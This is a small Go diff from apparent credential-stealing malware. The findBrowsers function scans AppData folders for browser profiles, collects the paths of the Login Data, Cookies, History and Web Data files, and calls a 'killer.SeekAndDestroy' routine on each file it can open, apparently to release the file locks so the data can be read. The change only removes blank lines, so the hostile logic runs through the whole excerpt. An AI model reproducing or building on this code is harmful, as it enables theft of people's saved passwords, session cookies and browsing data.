@@ -15,11 +15,8 @@ type Finder struct {
 
 func (f *Finder) findBrowsers() []structs.Browser {
 	found := make([]structs.Browser, 0)
-
 	rootDirs := []string{f.appData, f.localAppData}
-
 	profileNames := []string{"Default", "Profile"}
-
 	for _, root := range rootDirs {
 		directories, err := os.ReadDir(root)
 		if err != nil {
@@ -58,27 +55,22 @@ func (f *Finder) findBrowsers() []structs.Browser {
 									profile.History = filepath.Join(path, "History")
 									profile.LoginData = filepath.Join(path, "Login Data")
 									profile.Bookmarks = filepath.Join(path, "Bookmarks")
-
 									_, err := os.Open(filepath.Join(path, "Web Data"))
 									if err == nil {
 										killer.SeekAndDestroy(filepath.Join(path, "Web Data"))
 									}
-
 									_, err = os.Open(filepath.Join(path, "Network", "Cookies"))
 									if err == nil {
 										killer.SeekAndDestroy(filepath.Join(path, "Network", "Cookies"))
 									}
-
 									_, err = os.Open(filepath.Join(path, "History"))
 									if err == nil {
 										killer.SeekAndDestroy(filepath.Join(path, "History"))
 									}
-
 									_, err = os.Open(filepath.Join(path, "Login Data"))
 									if err == nil {
 										killer.SeekAndDestroy(filepath.Join(path, "Login Data"))
 									}
-
 									profiles = append(profiles, profile)
 									return nil
 								}
